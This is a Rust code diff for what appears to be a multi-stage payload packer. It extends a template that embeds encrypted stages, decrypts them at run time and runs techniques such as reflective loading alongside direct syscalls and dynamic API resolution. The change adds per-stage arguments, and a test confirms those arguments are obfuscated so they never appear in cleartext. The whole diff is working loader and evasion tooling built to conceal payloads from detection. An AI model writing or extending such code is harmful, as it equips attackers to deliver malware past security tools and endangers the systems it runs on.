@@ -13,7 +13,6 @@
 use std::collections::BTreeMap;
 
 use super::api_resolution::ApiResolutionConfig;
-use super::args::ArgsMode;
 use super::obfuscation::StringsConfig;
 use super::syscalls::SyscallsConfig;
 use super::{args, debug, imports, stub, syscalls, BuildError, Result};
@@ -72,6 +71,10 @@ pub struct StagePayload {
     pub exec: Option<ExecParams>,
     /// `sleep`: milliseconds.
     pub sleep_ms: u64,
+    /// `technique`: the payload's fixed arguments (`build.payload.args`).
+    pub payload_args: Vec<String>,
+    /// `technique`: whether the runtime args replace the YAML ones.
+    pub args_override: bool,
     /// Per-stage unique marker.
     pub marker: String,
     /// What to do when the stage completes.
@@ -136,12 +139,11 @@ pub fn render_stages_main_rs(
             &api_resolution.required_syscalls(),
         ),
     );
-    // Per-stage payload args are not supported in the first multi-stage version
-    // (validation rejects them), so the shared block builds an empty YAML-args
-    // list; the payload still receives the packed binary's runtime args.
+    // Per-stage payload args are delivered through a thread-local context the
+    // runner sets before each technique stage (`crate::set_stage_args`).
     values.insert(
         "$ARGS_BLOCK$".to_string(),
-        args::render_block(&[], ArgsMode::Join, &union, strings),
+        args::render_block_multistage(&union, strings),
     );
     values.insert(
         "$IMPORTS_BLOCK$".to_string(),
@@ -222,6 +224,11 @@ fn render_runner_body(stages: &[StagePayload], strings: &StringsConfig) -> Strin
                         .replace("$KEY$", &hex::encode(stage.key))
                         .replace("$LEN$", &stage.plaintext_len.to_string())
                         .replace("$MARKER$", &marker)
+                        .replace("$ARGS$", &args_expr(&stage.payload_args, strings))
+                        .replace(
+                            "$OVERRIDE$",
+                            if stage.args_override { "true" } else { "false" },
+                        )
                         .replace("$SUCCESS$", success_action(stage.on_success))
                         .replace("$FAILURE$", failure_action(stage.on_fail)),
                 );
@@ -245,6 +252,22 @@ fn render_runner_body(stages: &[StagePayload], strings: &StringsConfig) -> Strin
 
 fn sleep_line(ms: u64) -> String {
     format!("    std::thread::sleep(std::time::Duration::from_millis({ms}));\n")
+}
+
+/// The `Vec<String>` expression for a stage's YAML args, rebuilt at run time.
+fn args_expr(args: &[String], strings: &StringsConfig) -> String {
+    if args.is_empty() {
+        return "vec![]".to_string();
+    }
+    let mut body = String::from("vec![\n");
+    for (index, arg) in args.iter().enumerate() {
+        let expr = strings
+            .obfuscate(arg)
+            .render_stub_expr(&format!("stage_arg_{index}"));
+        body.push_str(&format!("            {expr},\n"));
+    }
+    body.push_str("        ]");
+    body
 }
 
 /// The `on_success` code appended after a stage sets `last`.
@@ -305,6 +328,7 @@ fn render_exec_fragment(stage: &StagePayload, strings: &StringsConfig) -> String
 /// The generated runner block for a `technique` stage.
 const TECHNIQUE_STAGE: &str = r#"
     {
+        crate::set_stage_args($ARGS$, $OVERRIDE$);
         let enc: &[u8] = include_bytes!("$PAYLOAD_PATH$");
         let mut image = decrypt_stage(enc, "$NONCE$", "$KEY$", $LEN$)?;
         let stub_marker: String = $MARKER$;
@@ -464,6 +488,8 @@ mod tests {
             runtime: vec![serde_yml::from_str("technique: reflective_loading\n").unwrap()],
             exec: None,
             sleep_ms: 0,
+            payload_args: Vec::new(),
+            args_override: false,
             marker: format!("STUB_MARKER_{index}"),
             on_success: StageOutcome::Continue,
             on_fail: StageFailure::Stop,
@@ -491,6 +517,8 @@ mod tests {
                 timeout_s: 30,
             }),
             sleep_ms: 0,
+            payload_args: Vec::new(),
+            args_override: false,
             marker: String::new(),
             on_success: StageOutcome::Continue,
             on_fail: StageFailure::Stop,
@@ -560,6 +588,31 @@ mod tests {
             out.contains("stage_1::run_exec()"),
             "runner does not call the exec stage"
         );
+    }
+
+    #[test]
+    fn per_stage_args_reach_the_runner_obfuscated() {
+        let mut stage = technique_stage(0);
+        stage.payload_args = vec!["--first".to_string()];
+        stage.args_override = true;
+        let params = StagesParams {
+            stages: vec![stage],
+            build_args: BTreeMap::new(),
+            debug: false,
+            windows_subsystem: false,
+        };
+        let out = render_stages_main_rs(
+            &template(),
+            &params,
+            &strings(),
+            &SyscallsConfig::default(),
+            &ApiResolutionConfig::default(),
+        )
+        .expect("render");
+        assert!(out.contains("crate::set_stage_args("), "stage args not set");
+        assert!(out.contains("set_stage_args"), "no stage-args context");
+        // The argument literal is rebuilt at runtime, never in cleartext.
+        assert!(!out.contains("--first"), "the arg leaked in cleartext");
     }
 
     #[test]
